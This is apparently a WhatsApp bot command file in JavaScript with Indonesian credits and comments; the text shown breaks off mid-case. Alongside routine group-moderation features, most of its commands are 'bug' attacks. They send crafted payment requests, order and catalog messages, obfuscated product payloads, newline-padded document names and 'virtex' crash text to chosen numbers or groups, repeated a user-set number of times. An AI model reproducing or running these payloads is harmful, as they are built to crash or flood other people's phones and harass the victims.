/*
// Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
   Apalagi Lari Dari Tanggung Jawab

// Base HwMods  : Copyan Dari Base Dika

› Create By Haikal
› Base Ori Haikal
› Copyan Base Dika Hisoka Morou

🌷 KALAU MAU RENAME TARO CREDITS GUA : ZALL MODS */

//=================================================//
require('./hwkal')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const os = require('os')
const mathjs = require('mathjs')
const chalk = require('chalk')
const cl = require('caliph-api') 
const axios = require('axios')
const path = require('path')
const mel = require('kitsune-api')
const moment = require('moment-timezone')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { exec, spawn, execSync } = require("child_process")
const { virtex, vipi } = require('./baseikal/virtex/virtex.js')
const { ngazap } = require('./baseikal/virtex/ngazap')
const { buttonvirus } = require('./baseikal/virtex/buttonvirus')
const { buttonkal } = require('./baseikal/virtex/buttonkal')
const { bugsw } = require('./baseikal/virtex/bugsw')
const { iphone } = require('./baseikal/virtex/iphone')
const { iphone1 } = require('./baseikal/virtex/iphone1')
const { iphone2 } = require('./baseikal/virtex/iphone2')
const { iphone3 } = require('./baseikal/virtex/iphone3')
const { iphone4 } = require('./baseikal/virtex/iphone4')
const { iphone5 } = require('./baseikal/virtex/iphone5')
const { iphone6 } = require('./baseikal/virtex/iphone6')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./baseikal/lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
//=================================================//
virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
const content = JSON.stringify(m.message)
const cerpen = require('./baseikal/lib/cerpen')
const kalimage = fs.readFileSync ('./baseikal/image/hwmodsgans.jpg')
const thumbnail = fs.readFileSync ('./baseikal/image/mamak.jpg')
const { mediafireDl } = require('./baseikal/lib/mediafire.js')
const banned = JSON.parse(fs.readFileSync('./baseikal/dbnye/banned.json'))
const ntilink = JSON.parse(fs.readFileSync("./baseikal/lib/antilink.json"))
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"
//=================================================//
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//=================================================//
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
moment.tz.setDefault("Asia/Jakarta").locale("id");
//=================================================//
module.exports = haikal = async (haikal, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await haikal.decodeJid(haikal.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const isBan = banned.includes(m.sender)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await haikal.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const welcm = m.isGroup ? wlcm.includes(from) : false
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false
//=================================================//
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false
}}}
//=================================================//
const deploy = (teks) => {
  haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
//=================================================//
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/@ZallMods`}}}, { quoted: m })} 
//=================================================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
} else global.db.data.chats[m.chat] = {
mute: false,
}
} catch (err) {
console.log(err)
}
//=================================================//
if (!haikal.public) {
if (!m.key.fromMe) return
}
//=================================================// 
let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.data.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.data.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})
//=================================================// 
var sticWait = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/wait.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticAdmin = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/BotAdman.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticOwner = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/owner.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticSukses = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SuksesCok.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticBanLu = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/BanLu.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var groupon = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/groupon.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var SiGroupadmin = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SiGroupadmin.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
//=================================================//
// Mute Chat
if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
return
}
//=================================================//
// AntiLink
if (AntiLink) {
linkgce = await haikal.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
m.reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(m.text)) {
bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await haikal.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
haikal.sendMessage(from, {text:`\`\`\`「 Detect Link 」\`\`\`\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: haikal.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, haikal.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
haikal.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
//=================================================//
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`
Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}
if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Hello Saya Bot ZALL ${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================//
switch(command) {
//=================================================//
case 'inibug': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
let teks = `══✪〘 *BANG INI BUG ? ☺️* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })}
}
break
//=================================================//
case 'poll': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO 👋 SAYA BOT ZALL MODS",
"options": [
{
"optionName": "KATANYA WA KEBAL"
},
{
"optionName": "BERANI VOTE GA"
},
{
"optionName": "VOTE LAH SEMUA"
},
{
"optionName": "KATANYA KEBAL"
},
{
"optionName": "SALAM BROTHER BY ZALL MODS"
}
],
"selectableOptionsCount": 5
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
deploy('sukses sendbug')}
}
break
//=================================================//
case 'jadikatalog': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image/sticker'
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','ZALL\x20MODS\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6281214281312','397419wzTxRp','6281214281312@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':haikal[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':kalimage,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':doc});haikal['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
}
}
break
//=================================================//
case 'troli2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return anjay(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": " BY ZALL MODS ",
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
//=================================================//
case 'santetdia': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER ZALL MODS`,
}
}}), { userJid: m.chat, quoted: doc})
haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
//=================================================//
case 'santetgc': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER ZALL MODS`,
}
}}), { userJid: m.chat, quoted: doc})
haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
//=================================================//
case 'ducu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
yy = fs.readFileSync('./baseikal/sound/hwmods.HW')
haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`ZALL APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
}
}
break
//=================================================//
case 'daca': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
 ilih = fs.readFileSync('./baseikal/sound/hwmods.HW')
 haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`ZALL APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'docu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 𝐉𝚫𝐍𝐒𝚵𝐍𝐌Ṏ𝐃𝐒🗿 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'duc': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `🔥 𝐉𝚫𝐍𝐒𝚵𝐍𝐌Ṏ𝐃𝐒🗿 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'virtext1': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/bb1b72bbbfe49eb7e993d.jpg' }, caption: `ZALL MODS ${iphone}` }, { quoted: doc })
}
}
break
case 'virtext2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/bb1b72bbbfe49eb7e993d.jpg' }, caption: `ZALL MODS ${iphone1}` }, { quoted: doc })
}
}
break
case 'virtext3': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/bb1b72bbbfe49eb7e993d.jpg' }, caption: `ZALL MODS ${iphone2}` }, { quoted: doc })
}
}
break
case 'virtext4': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
